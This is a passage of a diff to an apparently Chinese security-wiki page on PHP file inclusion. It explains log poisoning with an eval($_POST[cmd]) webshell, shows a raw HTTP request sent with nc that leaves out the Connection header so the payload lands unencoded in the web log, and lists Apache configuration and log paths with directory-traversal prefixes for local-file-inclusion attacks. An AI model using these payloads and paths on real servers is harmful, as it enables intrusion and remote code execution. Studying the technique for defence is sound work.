+&#x8FD9;&#x7C7B;&#x60C5;&#x51B5;&#x5199;&#x5165;web&#x65E5;&#x5FD7;&#xFF0C;&#x53EA;&#x80FD;&#x5728;short_open_tag=on&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x624D;&#x80FD;&#x6709;&#x6548;&#xFF0C;&#x5F53;short_open_tag=off&#x65F6;&#xFF0C;PHP&#x5C06;&#x4E0D;&#x652F;&#x6301;&lt;?/<strong>/eval($_POST[cmd]);/</strong>/?&gt;&#x8FD9;&#x6837;&#x7684;&#x77ED;&#x8BED;&#x53E5;</p><p>2.WEB&#x670D;&#x52A1;&#x5668;&#x4E00;&#x4E2A;&#x5947;&#x602A;&#x7684;&#x7279;&#x6027;</p><p>&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x800C;WEB&#x670D;&#x52A1;&#x5668;&#x53C8;&#x63A5;&#x53D7;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x8BF7;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x5C06;&#x539F;&#x5C01;&#x4E0D;&#x52A8;&#x7684;&#x5199;&#x5165;WEB&#x65E5;&#x5FD7;&#xFF0C;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;HTTP&#x7F16;&#x7801;.</p><p>&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x60F3;&#x4E2A;&#x529E;&#x6CD5;&#x4E00;&#x76F4;&#x4E0E;WEB&#x670D;&#x52A1;&#x5668;&#x4FDD;&#x6301;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x4E0D;&#x8BA9;WEB&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x54CD;&#x5E94;&#x8FD4;&#x56DE;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6211;&#x4EEC;&#x4E2D;&#x65AD;&#x8FD9;&#x6B21;TCP&#x8FDE;&#x63A5;&#xFF0C;&#x8BF4;&#x5F97;&#x8FD9;&#x4E48;&#x590D;&#x6742;&#x5176;&#x5B9E;&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;.&#x53EA;&#x8981;&#x5728;HTTP&#x8BF7;&#x6C42;&#x7684;&#x6570;&#x636E;&#x5305;&#x4E2D;&#x53BB;&#x6389;Connection HTTP&#x6807;&#x5934;&#x503C;&#x3002;</p><p>&#x5229;&#x7528;NC&#x4F2A;&#x9020;&#x6CA1;&#x6709;Connection HTTP&#x6807;&#x5934;&#x7684;&#x8BF7;&#x6C42;&#x5305;&#xFF1A;</p><pre><code>GET /index&lt; &gt;.php HTTP/1.1
+Accept: */*
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
+Host: 192.168.3.44</code></pre>
+<p>&#x4F60;&#x4F1A;&#x53D1;&#x73B0;WEB&#x670D;&#x52A1;&#x5668;&#x4E00;&#x76F4;&#x4E0D;&#x4F1A;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#xFF0C;&#x76F4;&#x5230;&#x6211;&#x4EEC;&#x5BA2;&#x6237;&#x7AEF;&#x65AD;&#x5F00;&#x8FD9;&#x6B21;&#x8FDE;&#x63A5;&#xFF0C;&#x8FD9;&#x4E2A;&#x90AA;&#x6076;&#x7684;&#x7A7A;&#x683C;&#x4FBF;&#x5199;&#x5165;&#x4E86;WEB&#x65E5;&#x5FD7;&#xFF01;</p><ul><li>conf file paths targeted by LFI
+</li></ul>
+<pre><code>/etc/apache2/httpd.conf
+/etc/httpd/httpd.conf
+</code></pre>
+<ul><li>Popular log file paths targeted by LFI
+</li></ul>
+<pre><code>../apache/logs/error.log
+../apache/logs/access.log
+../../apache/logs/error.log
+../../apache/logs/access.log
+../../../apache/logs/error.log
+../../../apache/logs/access.log
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../var/www/logs/access_log
+../../../../../../../var/www/logs/access.log
+../../../../../../../usr/local/apache/logs/access_ log
+../../../../../../../usr/local/apache/logs/access. log
+../../../../../../../var/log/apache/access_log
+../../../../../../../var/log/apache2/access_log
+../../../../../../../var/log/apache/access.log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/access_log
+../../../../../../../var/log/access.log
+../../../../../../../var/www/logs/error_log
+../../../../../../../var/www/logs/error.log
+../../../../../../../usr/local/apache/logs/error_l og
+../../../../../../../usr/local/apache/logs/error.l og
+../../../../../../../var/log/apache/error_log
+../../../../../../../var/log/apache2/error_log
+../../../../../../../var/log/apache/error.log
+../../../../../../../var/log/apache2/error.log
+../../../../../../../var/log/error_log
+../../../../../../../var/log/error.log
 
+19. C:\apache\logs\access.log
+20. C:\Program Files\Apache Group\Apache\logs\access.log
+21. C:\program files\wamp\apache2\logs
+22. C:\wamp\logs
+23. C:\xampp\apache\logs\error.log
 
-<p>你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！</p>
-<ul>
-<li>conf file paths targeted by LFI</li>
-</ul>
-<div class="hlcode"><pre><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
-<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
-</pre></div>
+38. C:\apache\logs\error.log
+39. C:\Program Files\Apache Group\Apache\logs\error.log
+40. C:\wamp\apache2\logs
+41. C:\xampp\apache\logs\access.log
+</code></pre>
 
-
-<ul>
-<li>Popular log file paths targeted by LFI</li>
-</ul>
-<div class="hlcode"><pre><span class="cp">../apache/logs/error.log</span>
-<span class="cp">../apache/logs/access.log</span>
-<span class="cp">../../apache/logs/error.log</span>
-<span class="cp">../../apache/logs/access.log</span>
-<span class="cp">../../../apache/logs/error.log</span>
-<span class="cp">../../../apache/logs/access.log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/acces_log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/acces.log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
-<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
-<span class="cp">../../../../../../../var/www/logs/access_log</span>
-<span class="cp">../../../../../../../var/www/logs/access.log</span>
-<span class="cp">../../../../../../../usr/local/apache/logs/access_ log</span>
-<span class="cp">../../../../../../../usr/local/apache/logs/access. log</span>
-<span class="cp">../../../../../../../var/log/apache/access_log</span>
-<span class="cp">../../../../../../../var/log/apache2/access_log</span>
-<span class="cp">../../../../../../../var/log/apache/access.log</span>
-<span class="cp">../../../../../../../var/log/apache2/access.log</span>
-<span class="cp">../../../../../../../var/log/access_log</span>
-<span class="cp">../../../../../../../var/log/access.log</span>
-<span class="cp">../../../../../../../var/www/logs/error_log</span>
-<span class="cp">../../../../../../../var/www/logs/error.log</span>
-<span class="cp">../../../../../../../usr/local/apache/logs/error_l og</span>
-<span class="cp">../../../../../../../usr/local/apache/logs/error.l og</span>
-<span class="cp">../../../../../../../var/log/apache/error_log</span>
-<span class="cp">../../../../../../../var/log/apache2/error_log</span>
-<span class="cp">../../../../../../../var/log/apache/error.log</span>
-<span class="cp">../../../../../../../var/log/apache2/error.log</span>
-<span class="cp">../../../../../../../var/log/error_log</span>
-<span class="cp">../../../../../../../var/log/error.log</span>
-
-<span class="m">19.</span> C:\apache\logs\access.log
-<span class="m">20.</span> C:\Program Files\Apache Group\Apache\logs\access.log
-<span class="m">21.</span> C:\program files\wamp\apache2\logs
-<span class="m">22.</span> C:\wamp\logs
-<span class="m">23.</span> C:\xampp\apache\logs\error.log
-
-<span class="m">38.</span> C:\apache\logs\error.log
-<span class="m">39.</span> C:\Program Files\Apache Group\Apache\logs\error.log
-<span class="m">40.</span> C:\wamp\apache2\logs
-<span class="m">41.</span> C:\xampp\apache\logs\access.log
-</pre></div>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
 </div>
 
-        </div>
-        <div id="footer">
-            <span>
-                Copyright © 2012-2016 .
-                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
-            </span>
-        </div>
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="php-match-or-comapre.html" class="navigation navigation-prev " aria-label="Previous page: php match or comapre">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="ssrf.html" class="navigation navigation-next " aria-label="Next page: ssrf">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
         
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"php 文件包含","date":"2016-02-24 16:47","level":"1.4.19","depth":2,"next":{"title":"ssrf","level":"1.4.20","depth":2,"path":"WebSecurity/ssrf.md","ref":"WebSecurity/ssrf.md","articles":[]},"previous":{"title":"php match or comapre","level":"1.4.18","depth":2,"path":"WebSecurity/php-match-or-comapre.md","ref":"WebSecurity/php-match-or-comapre.md","articles":[]},"dir":"ltr"},"config":{"plugins":["livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"janes","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Wiki | janes","language":"cn","gitbook":">= 3.2.0"},"file":{"path":"WebSecurity/php-文件包含.md","mtime":"2016-08-16T14:00:50.457Z","type":"markdown"},"gitbook":{"version":"3.2.0","time":"2016-08-16T16:38:45.378Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
     </body>
 </html>
+
